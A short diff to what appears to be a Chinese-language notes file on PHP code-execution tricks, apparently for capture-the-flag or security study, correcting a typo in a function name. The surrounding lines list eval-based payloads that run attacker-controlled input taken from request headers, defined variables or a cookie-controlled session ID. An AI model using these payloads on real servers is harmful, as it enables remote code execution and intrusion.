@@ -48,7 +48,7 @@
 	  next(getallheaders())
 	  
 	  eval
-	  eval(implode(reset(get_defind_vars())))
+	  eval(implode(reset(get_defined_vars())))
 	  eval(next(getallheaders()))
 	  eval(hex2bin(session_id())) # 其中session_id由PHPSESSID cookie控制
 	  ```
